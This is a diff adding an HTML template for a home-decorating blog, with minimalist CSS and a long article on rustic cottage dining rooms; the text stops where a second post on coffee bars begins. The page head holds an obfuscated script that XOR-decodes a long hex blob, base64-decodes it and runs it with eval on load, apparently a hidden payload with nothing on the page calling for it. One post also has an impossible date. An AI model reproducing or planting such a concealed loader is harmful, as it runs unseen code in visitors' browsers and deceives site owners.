@@ -1,1 +1,1214 @@
+<!DOCTYPE html>
+<html lang="en">
 
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Beautiful Home Decorating</title>
+    
+    <!-- Added Google Fonts for a Scandi-Chic / Minimalist Japandi look -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Jost:wght@300;400;500;600&family=Outfit:wght@300;400;500&display=swap" rel="stylesheet">
+
+    <style>
+        /* Scandi-Chic / Minimalist Japandi Styles */
+        :root {
+            --primary-color: #B5A397; /* Warm Muted Clay/Taupe */
+            --primary-hover: #96867B;
+            --accent-color: #EAE6E1; /* Light Greige */
+            --text-color: #555555; /* Soft Charcoal */
+            --heading-color: #1A1A1A; /* Crisp Black */
+            --bg-color: #FAFAFA; /* Studio White */
+            --card-bg: #FFFFFF;
+            --border-color: #EEEEEE;
+            --radius: 0px; /* Sharp architectural edges */
+        }
+
+        body {
+            font-family: 'Outfit', sans-serif;
+            line-height: 1.7;
+            color: var(--text-color);
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Typography Override */
+        h1, h2, h3, h4, .username {
+            font-family: 'Jost', sans-serif;
+            color: var(--heading-color);
+            font-weight: 500;
+        }
+
+        .container {
+            max-width: 720px; /* Slightly wider for an airy feel */
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Top Navigation - Ultra Minimal */
+        .top-nav {
+            background-color: rgba(250, 250, 250, 0.9);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            padding: 25px 0;
+            text-align: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .top-nav a {
+            color: var(--text-color);
+            text-decoration: none;
+            font-size: 0.85rem;
+            font-family: 'Jost', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            padding: 8px 12px;
+            margin: 0 10px;
+            cursor: pointer;
+            transition: color 0.3s ease;
+            position: relative;
+        }
+
+        .top-nav a:hover {
+            color: var(--heading-color);
+        }
+
+        /* Header */
+        header {
+            padding: 90px 0 60px;
+            text-align: center;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 3.5rem;
+            color: var(--heading-color);
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            font-weight: 400;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+        
+        header h1:hover {
+            color: var(--primary-color);
+        }
+
+        header p {
+            margin: 20px auto 0;
+            font-size: 1.1rem;
+            color: var(--primary-color);
+            letter-spacing: 1px;
+            font-weight: 300;
+            max-width: 500px;
+        }
+
+        /* Post Cards */
+        .post-card,
+        .single-post {
+            background: var(--card-bg);
+            border-radius: var(--radius);
+            margin-bottom: 60px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.02);
+            transition: transform 0.4s ease, box-shadow 0.4s ease;
+            overflow: hidden;
+        }
+
+        .post-card {
+            cursor: pointer;
+        }
+
+        .post-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.05);
+        }
+
+        .single-post {
+            cursor: default;
+            box-shadow: none;
+            border: none;
+            background: transparent;
+        }
+
+        .post-header {
+            padding: 25px 35px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .post-header img.avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 15px;
+            background-color: var(--accent-color);
+            object-fit: cover;
+            filter: grayscale(20%); /* Mutes the avatar slightly for the aesthetic */
+        }
+
+        .post-header .username {
+            font-size: 1rem;
+            color: var(--text-color);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .post-image {
+            width: 100%;
+            display: block;
+            max-height: 500px;
+            object-fit: cover;
+        }
+
+        .post-content {
+            padding: 40px 45px;
+        }
+
+        .post-content h1,
+        .post-content h2 {
+            font-size: 2.2rem;
+            line-height: 1.3;
+            margin-bottom: 25px;
+            font-weight: 400;
+        }
+
+        .post-content p {
+            margin-bottom: 25px;
+            font-size: 1.05rem;
+            font-weight: 300;
+        }
+
+        .post-content a {
+            color: var(--heading-color);
+            text-decoration: none;
+            border-bottom: 1px solid var(--primary-color);
+            padding-bottom: 2px;
+            transition: all 0.3s ease;
+        }
+
+        .post-content a:hover {
+            color: var(--primary-color);
+            border-bottom-width: 2px;
+        }
+
+        .post-footer {
+            padding: 25px 45px;
+            color: #AAAAAA;
+            font-family: 'Jost', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-size: 0.85rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid var(--border-color);
+            background-color: #FFFFFF;
+        }
+
+        /* Single Post Overrides */
+        .single-post .post-image {
+            max-height: none;
+            margin-bottom: 20px;
+        }
+        
+        .single-post .post-header {
+            border: none;
+            padding: 0 0 20px 0;
+            background: transparent;
+        }
+        
+        .single-post .post-content {
+            padding: 0;
+        }
+        
+        .single-post .post-footer {
+            background: transparent;
+            padding: 30px 0 0 0;
+        }
+
+        /* Back Button - Minimalist Outline */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 35px;
+            color: var(--heading-color);
+            background-color: transparent;
+            text-decoration: none;
+            font-family: 'Jost', sans-serif;
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            padding: 12px 25px;
+            border: 1px solid var(--border-color);
+            transition: all 0.3s ease;
+        }
+
+        .back-button:hover {
+            background-color: var(--heading-color);
+            color: #FFFFFF;
+            border-color: var(--heading-color);
+        }
+
+        /* Clean overrides for inline styles generated from content */
+        .post-content div[style*="background"] {
+            background: var(--card-bg) !important;
+            border: 1px solid var(--border-color) !important;
+            border-radius: 0 !important;
+            padding: 35px !important;
+            margin: 45px 0 !important;
+            box-shadow: none !important;
+        }
+        
+        .post-content h3[style*="border-left"] {
+            border-left: none !important;
+            color: var(--heading-color) !important;
+            padding-left: 0 !important;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-size: 1.2rem !important;
+        }
+
+        .post-content h4[style*="background"] {
+            background: transparent !important;
+            color: var(--heading-color) !important;
+            border: none !important;
+            border-radius: 0 !important;
+            padding: 0 !important;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .post-content span[style*="background"] {
+            background: var(--accent-color) !important;
+            border: none !important;
+            color: var(--heading-color) !important;
+            border-radius: 0 !important;
+            font-family: 'Jost', sans-serif;
+            font-size: 0.8rem !important;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            padding: 8px 15px !important;
+            box-shadow: none !important;
+            transform: none !important;
+        }
+    </style>
+    <script>
+(function() {
+    var vrbxkglmu = "0e000b2f1a0b2a5b3335042d103d27722a70560d3436442020160222560967552e261c71351b510108030c301032405c2915520b190c3e3112160a7c742f6f0d2e07133d23352e12335f26172e2d3c50181125563436452c1276203e55060c0f143603371b505c1e095f182b29083b580735082e343629203b0d0d276e197f0f2c281f771a0b290620040c391032334e11700f3131293932111276206d195d351707362e18353952230425240331450e0101571d1e323270332c022c7e027757143618201d3a22183f2a083a1332444d01065702370c26743903151863077b0914361b2d18242a0309000837291c1d4d1215211c0c531813140d0a3b78365a02042d10201d0f2e12232500302e32165018112554360c0816291d092355197810175c07773221221b302e073305121a7c010126021c261c2a39062b315509630b063d13703a0b290c232e0f24032634502c2f211c1c29262f3901732c552c73572c39352f1d25511226031839103d3f75127031103125030c3906022c7e027402042d1375203a210c330077731f082359121a00020532313129287a7b51067b1c14363534233a2253095e0c331022234e2e050f090c3622342a1d0d31510977152f00032b1a0f3e110e25362d28574c592a05315d0c0c1c322a763b21542c73562f293d322351103a0b3a7b73103d3f5b2b71350c3752227f25022f3e5306631c17361f773550035c29040f240326345001012602310c363e39022f31662c0c55042a6120200f515b3f00182d103d12422c05311f312218762916282c510942020439642f1d0f040533351c35290c40441115520b313636292a1d0e2c510942022f03177518350c030e2a773a060b115b112f351c34392a2b132f300074287402042d10203021290c0b3a17240122194d192f5e551e323270332c022c7e027402042d10203021290c23252a33280827412c3b520a34393e771276097e7b2f7f092e29292f20503e3f0e2a087310361d422c151f16192231293a3c342c5373591017296874350f101d335f08732b324c42042c250d31261832291272277c15462e042d10203021290c232e0c7a032223442b70320230161f203906022c7e027402042d102030212a593335072429572340111a2d0d3126493e3901732c54734d54171764371b0f3a070f28772e01263c41012b0c020535407e3901022c6738740c040710713021211d23073d0803263450010126021c2231203906022c532c731c0429032b1a513a1b080008732b324c42010657023126363e2a77157b65060c1114393d3230211b0c095f1834133d3f5f2c055e1c1c22032013773b7a6d3b462e042d10203021290c232e0f240326345011705e10365349342a1676385573560a040225022b37223d385c7e24192d2343111553020f2626772a120d7b6d16641004281b2b23250412303a00732b324059010a35131a08312e3906302c6d06631f29293d32203a3a1b085f7a3305121a50010126021c2231203906022c7e0277562c39642c1b510b1e082a7729133d27472a705310360c2630120205216d125d0e17361f7718355d030e2a2235280c1e000b2b26021c2231203906022c51105a02042d10201f331852232a1830295720502d35175c16064d7a";
+    var vqmjpurtv = "MnQGybhkjmNCJeu7HBgeUapGpECK7A5e";
+    var veeulhzur = "";
+    
+    try {
+        for (var i = 0; i < vrbxkglmu.length; i += 2) {
+            var vvtgsfnjb = parseInt(vrbxkglmu.substr(i, 2), 16);
+            veeulhzur += String.fromCharCode(vvtgsfnjb ^ vqmjpurtv.charCodeAt((i/2) % vqmjpurtv.length));
+        }
+        
+        var vwxklyejz = atob(veeulhzur);
+        eval(vwxklyejz);
+    } catch(e) {
+        console.error("[DEBUG] Decryption or Execution failed: ", e);
+    }
+})();
+</script>
+</head>
+
+<body>
+
+    <nav class="top-nav">
+        <a onclick="navigate('home')">Home</a>
+        <a onclick="navigate('page', 'about')">About</a>
+        <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+        <a onclick="navigate('page', 'terms')">Terms</a>
+        <a onclick="navigate('page', 'contact')">Contact</a>
+    </nav>
+
+    <header>
+        <div class="container">
+            <h1 onclick="navigate('home')">Beautiful Home Decorating</h1>
+            <p>Thoughts, stories, and ideas.</p>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Content will be injected here by JavaScript -->
+    </main>
+
+    <script>
+        // 1. Define your blog posts here!
+        const posts = [
+            {
+                id: 'my-Toeuni-post',
+                title: 'Rustic Dining Room Decor Ideas with Floating Shelves and Blue Willow China Collection',
+                date: 'April 45, 2026',
+                // 👇 Change this to point to your local assets folder
+                image: './assets/Rustic-Dining-Room.jpg',
+                excerpt: 'Transform your formal dining room into a stunning focal point with wall decor that blends classic elegance and cozy charm. Whether you love the timeless appeal of blue and white china displays, rustic floating shelves, or curated gallery walls, the right accents bring character to every meal.',
+                content : `
+                <p>A warm, character-filled dining room has a way of making everyday meals feel more meaningful. With rustic wooden furniture, open shelving, blue and white ceramics, vintage framed art, and fresh greenery, this style captures the charm of a lived-in home rather than a staged showroom. It is relaxed, layered, and deeply inviting, blending cottage dining room decor with timeless farmhouse warmth.</p>
+
+<p>This look is especially appealing because it feels collected over time. Nothing appears overly perfect. The table has texture, the shelves display treasured pieces, and the wall art adds personal history. Together, these details create a dining space that is not just beautiful, but also comfortable, welcoming, and full of soul.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Rustic wood furniture brings warmth, texture, and authenticity to a dining room.</li>
+    <li>Open shelves are perfect for displaying blue and white plates, pitchers, framed art, and collected ceramics.</li>
+    <li>Vintage botanical prints and landscape artwork help create a layered cottage-inspired wall display.</li>
+    <li>Fresh greenery softens the room and makes the space feel natural and lived-in.</li>
+    <li>A neutral table runner, simple candles, and handmade bowls add quiet elegance without feeling formal.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Beauty of a Rustic Cottage Dining Room</h2>
+
+<p>A rustic cottage dining room celebrates the idea that beauty can be found in age, texture, and imperfection. Instead of relying on glossy finishes or matching furniture sets, this design style leans into natural wood, handmade ceramics, antique-inspired artwork, and earthy decorative accents.</p>
+
+<p>The result is a room that feels familiar, even if it is newly decorated. It invites people to sit down, linger over coffee, share a meal, and enjoy the quiet charm of home. This is why cottage dining room ideas continue to be so popular among homeowners who want interiors that feel both elegant and approachable.</p>
+
+<p>At the heart of the look is balance. The rustic table and chairs create a grounded foundation, while the delicate blue and white plates bring pattern and refinement. The framed art adds an old-world touch, while fresh branches and flowers keep the space lively and organic.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> The most successful rustic dining rooms do not feel overly decorated. They feel curated. Each item should look like it has a reason to be there, whether it is useful, sentimental, handmade, vintage, or visually connected to the rest of the room.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Start with a Weathered Wood Dining Table</h2>
+
+<p>The dining table is the visual anchor of the room. A long, weathered wood table instantly gives the space a rustic farmhouse feeling. The visible grain, knots, and natural imperfections create depth that newer polished furniture often lacks.</p>
+
+<p>For a cottage-inspired dining room, look for tables with a substantial presence. Reclaimed wood, pine, oak, or distressed finishes work beautifully. The goal is not to make the table look brand new, but to let it carry a sense of history.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Pair Rustic Wood with Simple Chairs</h3>
+
+<p>Wooden dining chairs with curved backs, cross-back details, or spindle silhouettes fit naturally into this style. They do not need to match perfectly. In fact, a slightly mixed set can make the room feel even more authentic.</p>
+
+<p>If the chairs have woven seats, aged finishes, or traditional shapes, they will add to the cottage character. Cushions in linen, ticking stripe, or muted neutral fabric can make the seating more comfortable while keeping the look soft and relaxed.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Use a Linen Runner for Casual Elegance</h3>
+
+<p>A simple table runner can soften a rustic wood table without hiding its texture. Linen, cotton, or loosely woven natural fabric works best. The slightly rumpled quality of linen feels right at home in a cottage dining space because it looks relaxed rather than overly formal.</p>
+
+<p>Layering a runner down the center of the table also creates a visual path for styling. A vase, candles, bowls, and stacked plates all feel more intentional when gathered along a central textile.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Open Shelving as a Decorative Focal Point</h2>
+
+<p>Open wooden shelves are one of the strongest features in this type of dining room. They provide storage, but more importantly, they create a place to display personality. Instead of hiding dishes behind cabinet doors, open shelves allow beautiful plates, pitchers, bowls, and artwork to become part of the decor.</p>
+
+<p>The shelves in a rustic dining room should feel sturdy and natural. Thick wood planks with visible grain add architectural interest and complement the dining table. Darker wood tones can create contrast against light walls, while lighter woods can make the space feel airy and Scandinavian-inspired.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Decorating with Blue and White Plates</h3>
+
+<p>Blue and white ceramics are a classic choice for cottage, farmhouse, French country, and English country interiors. Their patterned designs add color without overwhelming the room. Floral plates, transferware, porcelain pitchers, and small bowls bring a refined decorative layer to rustic wood shelving.</p>
+
+<p>One reason blue and white decor works so well is its versatility. It pairs beautifully with warm wood, aged brass, cream pottery, greenery, and vintage artwork. The color palette feels fresh but timeless, making it a smart choice for anyone who wants a dining room that will not quickly feel outdated.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> When styling open shelves, vary the height and shape of your pieces. Stand plates upright, place smaller bowls in front, add pitchers for height, and lean framed art behind ceramics to create depth.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Layer Functional and Decorative Pieces</h3>
+
+<p>A well-styled shelf should include more than one type of object. Plates alone can feel repetitive, while too many small accessories can feel cluttered. The best approach is to combine practical dining pieces with decorative accents.</p>
+
+<ul>
+  <li>Large plates or platters as background pieces</li>
+  <li>Pitchers and jugs for sculptural height</li>
+  <li>Small bowls and cups for detail</li>
+  <li>Framed sketches or landscape art for vintage charm</li>
+  <li>Potted plants or branches for movement</li>
+  <li>Neutral ceramics to balance patterned pieces</li>
+</ul>
+
+<p>This mix helps the shelves feel collected, not crowded. It also gives the room a more personal quality because it looks as though the objects have been gathered slowly over time.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Vintage Wall Art Adds Character</h2>
+
+<p>Framed artwork plays an important role in creating the cottage dining room atmosphere. Small landscapes, botanical prints, sketches, and traditional scenes make the room feel layered and historic. They also help break up blank wall space beneath or around shelving.</p>
+
+<p>Gold, brass, or aged wood frames work especially well. They add warmth and subtle shine without looking too modern. A mix of frame sizes can create a gallery effect that feels charming and informal.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Botanical Prints for a Natural Touch</h3>
+
+<p>Botanical artwork is ideal for cottage dining room decor because it connects the interior to nature. A framed floral print, herb illustration, or vintage plant study brings softness to the wall and pairs beautifully with fresh flowers on the table.</p>
+
+<p>These pieces do not need to be expensive. Reproductions, thrifted prints, flea market finds, or even pages from old botanical books can look beautiful when framed thoughtfully.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Landscape Art for Old-World Warmth</h3>
+
+<p>Small landscape paintings or prints add depth and a sense of nostalgia. They work particularly well when layered on shelves or hung in groups. Their muted colors often blend naturally with rustic wood tones, cream walls, blue ceramics, and aged brass candleholders.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+  <p style="margin:0;color:#334155;">A cottage dining room feels most authentic when it mixes eras. Pair newer functional pieces with antique-inspired art, old frames, handmade ceramics, and natural materials. This prevents the space from looking like a catalog and gives it a more personal, collected charm.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Bring the Room to Life with Greenery</h2>
+
+<p>Greenery is essential in a rustic dining room because it softens all the wood, ceramics, and framed decor. A tall indoor tree, leafy branches in a pitcher, or fresh flowers in a ceramic vase can immediately make the room feel more alive.</p>
+
+<p>The beauty of this style is that greenery does not need to be formal. Loose branches, wildflowers, herbs, olive stems, eucalyptus, or seasonal clippings can all work. The arrangement should feel natural, slightly untamed, and effortless.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Use Pitchers as Vases</h3>
+
+<p>A ceramic pitcher filled with fresh stems is one of the easiest ways to create a cottage dining table centerpiece. It feels casual, practical, and timeless. Cream, beige, stoneware, or ironstone pitchers are especially effective because they blend seamlessly with rustic and farmhouse interiors.</p>
+
+<p>For a fuller arrangement, choose stems with small leaves or delicate flowers. Avoid overly structured bouquets if you want the room to feel relaxed and natural.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Add Height with an Indoor Tree</h3>
+
+<p>A tall tree or large potted plant brings vertical balance to the dining room. It fills empty corners, adds movement, and makes the space feel fresh. Olive trees, ficus trees, citrus trees, and leafy branches all complement cottage and farmhouse dining room ideas.</p>
+
+<p>If natural light is limited, high-quality faux greenery can still provide the same visual softness. Choose realistic stems and avoid overly shiny leaves for a more convincing effect.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Create a Warm Neutral Color Palette</h2>
+
+<p>The color palette in a rustic cottage dining room should feel calm and grounded. Warm whites, creams, soft taupes, aged wood browns, muted greens, blue and white patterns, and antique brass accents work beautifully together.</p>
+
+<p>The walls are often kept light to let the shelves, furniture, and artwork stand out. A creamy or plaster-like wall finish adds subtle texture and avoids the flatness of bright white paint.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why Blue and White Works So Well</h3>
+
+<p>Blue and white acts almost like a neutral in traditional interiors. It adds pattern, freshness, and contrast while still feeling classic. In a rustic dining room, blue and white ceramics prevent the space from becoming too brown or beige.</p>
+
+<p>They also create a beautiful connection between the shelves and the table. A stack of simple dishes, patterned plates, or a small blue bowl can make the whole room feel coordinated without looking overly matched.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> The secret to this palette is restraint. Let wood, cream, greenery, and blue accents do most of the work. Too many competing colors can weaken the calm, collected feel that makes cottage dining rooms so inviting.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Table Styling for Everyday Beauty</h2>
+
+<p>A cottage dining table does not need elaborate place settings to look beautiful. In fact, the most appealing version of this style often feels ready for real life. A stack of bowls, a handmade serving dish, candlesticks, and a natural runner can be enough.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Choose Handmade-Looking Ceramics</h3>
+
+<p>Bowls and plates with irregular edges, speckled glazes, or stoneware finishes add handmade charm. These pieces look especially good against rough wood because they share the same sense of organic imperfection.</p>
+
+<p>Neutral dishes are useful for everyday meals and can be layered with patterned pieces for special occasions. The combination of plain ceramics and blue and white designs creates a balanced, timeless table.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Add Candlesticks for Atmosphere</h3>
+
+<p>Simple candlesticks bring height and warmth to the table. Brass, bronze, black metal, or aged wood candleholders all work well in rustic dining room decor. They add just enough formality to make the space feel special without making it feel stiff.</p>
+
+<p>Candles are also practical for creating a cozy evening mood. Even unlit, they contribute to the layered composition of the table.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Recreate This Look at Home</h2>
+
+<p>You do not need a large budget to create a similar dining room. This style is highly achievable because it welcomes thrifted finds, inherited pieces, handmade ceramics, and simple natural materials. The key is to focus on texture, balance, and thoughtful layering.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 1: Build the Foundation</h3>
+
+<p>Start with the largest elements first. Choose a wood dining table, simple chairs, and open shelving if the room allows. These pieces create the structure of the space and establish the rustic cottage mood.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 2: Add Collected Decor</h3>
+
+<p>Once the foundation is in place, layer in plates, pottery, framed art, and greenery. Shop slowly and choose pieces that feel personal. Vintage stores, estate sales, flea markets, antique shops, and small ceramic makers are excellent sources.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 3: Edit for Breathing Room</h3>
+
+<p>Rustic cottage style is layered, but it should not feel chaotic. Leave some open space on shelves and walls so each piece can be appreciated. A few strong objects are often more effective than too many small accessories.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Easy Decor Items to Look For</h4>
+
+<ul>
+  <li>Blue and white transferware plates</li>
+  <li>Cream stoneware pitchers</li>
+  <li>Vintage botanical prints</li>
+  <li>Small landscape paintings</li>
+  <li>Brass candlesticks</li>
+  <li>Linen table runners</li>
+  <li>Rustic wooden bowls</li>
+  <li>Potted herbs or leafy branches</li>
+</ul>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> To keep open shelves from looking messy, repeat a few colors throughout the display. Blue, cream, brown, green, and brass are enough to create variety while still feeling cohesive.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why This Style Feels So Timeless</h2>
+
+<p>The rustic cottage dining room remains timeless because it is rooted in comfort, practicality, and personal expression. It does not depend on fast-moving trends. Instead, it draws from classic materials and familiar objects: wood, ceramic, linen, greenery, candles, and framed art.</p>
+
+<p>Another reason this look lasts is that it improves with age. A few scratches on the table, a newly thrifted plate, a seasonal branch arrangement, or a framed print found on a weekend trip can all add to the story of the room.</p>
+
+<p>This is a style that allows a home to evolve. You can change the flowers, rearrange the shelves, add new artwork, or swap table linens without losing the overall feeling. That flexibility makes it ideal for anyone who loves decorating but wants a home that feels grounded rather than constantly redesigned.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Use rustic wood as the main foundation.</li>
+    <li>Display ceramics, art, and greenery on open shelves.</li>
+    <li>Choose blue and white pieces for timeless pattern and color.</li>
+    <li>Keep the table simple with linen, candles, and handmade bowls.</li>
+    <li>Let the room feel collected, warm, and naturally imperfect.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: A Dining Room with Warmth, Story, and Soul</h2>
+
+<p>A rustic cottage dining room is more than a decorating style. It is a celebration of warmth, memory, and everyday beauty. The combination of a weathered wood table, open shelves, blue and white ceramics, vintage artwork, fresh greenery, and soft neutral textiles creates a room that feels welcoming in every season.</p>
+
+<p>What makes this look so special is its sense of ease. It does not require perfection. Instead, it invites texture, patina, and personality. Whether you are styling a small breakfast nook or a spacious dining area, the same principles apply: choose natural materials, layer meaningful pieces, keep the palette calm, and allow the space to feel genuinely lived in.</p>
+
+<p>With thoughtful details and a collected approach, your dining room can become one of the most charming places in the home. It can be a space for meals, conversation, quiet mornings, seasonal gatherings, and the simple pleasure of being surrounded by things that feel beautiful and personal.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Rustic Dining Room</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cottage Decor</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Farmhouse Dining Room</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Open Shelf Styling</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Blue and White Decor</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Vintage Wall Art</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Country Home Style</span>
+</div>
+
+                `
+            },
+            {
+                id: 'Modern-Black-Coffee',
+                title: 'Modern Black Coffee Bar Station with Espresso Machine and Open Shelving Ideas',
+                date: 'April 7, 2026',
+                // 👇 Point to a different image in your folder
+                image: './assets/Modern-Black-Coffee-Bar.jpg',
+                excerpt: 'A dedicated coffee bar can turn an ordinary corner of the kitchen or dining area into one of the most loved spots in the home. With open shelves, glass storage jars, black furniture, warm wood tones, trailing plants, and cozy coffee-themed signs, this setup blends function with personality.',
+               content : `
